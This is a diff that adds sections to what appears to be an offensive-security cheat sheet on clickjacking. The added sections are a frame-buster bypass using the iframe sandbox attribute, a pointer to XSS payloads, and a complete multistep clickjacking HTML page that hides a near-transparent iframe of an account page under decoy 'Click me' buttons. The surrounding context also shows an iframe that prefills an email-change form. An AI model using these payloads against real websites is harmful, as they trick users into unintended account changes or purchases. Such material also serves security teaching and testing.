@@ -6,6 +6,10 @@ Clickjacking, also known as a 'UI redress attack,' is a malicious technique wher
 
 - [how it works](#how-it-works)
 - [default payload](#default-payload)
+- [Clickjacking with prefilled form input](#clickjacking-with-prefilled-form-input)
+- [Frame busting scripts](#frame-busting-scripts)
+- [Combining clickjacking with a DOM XSS attack](#combining-clickjacking-with-a-dom-xss-attack)
+- [Multistep clickjacking](#multistep-clickjacking)
 
 ## How it works ? 
 
@@ -60,7 +64,74 @@ could be change to:
 <iframe id="target_website" src="https://vulnerable-website.com/change-email?email=pwn@gg.com">
 ```
 
+## Frame busting scripts
 
+Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites.
+
+An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. 
+
+When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
+
+```html
+<iframe id="target_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
+```
+
+*:warning: Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled.*
+
+
+## Combining clickjacking with a DOM XSS attack
+
+Clickjacking is highly effective in coercing users into performing malicious actions.
+
+[xss cheat sheet](/web/xss.md)
+
+## Multistep clickjacking
+
+Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.
+
+example:
+
+```html
+<html>
+    <head>
+        <style>
+            #target_website {
+                position:relative;
+                width:800px;
+                height:600px;
+                opacity:0.00001;
+                z-index:3;
+                }
+            #decoy_website {
+                position:absolute;
+                width:300px;
+                height:400px;
+                z-index:1;
+                top: 495;
+                left: 77;
+                }
+            #decoy_two {
+                position:absolute;
+                width:300px;
+                height:400px;
+                z-index:2;
+                top: 255;
+                left: 200;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="decoy_website">
+            <button class="button" type="submit">Click me first</button>
+        </div>
+        <div id="decoy_two">
+            <button class="button" type="submit">Click me next</button>
+        </div>
+        <iframe id="target_website" src="https://vuln.net/my-account">
+        </iframe>
+    </body>
+</html>
+```
 
 ---
 
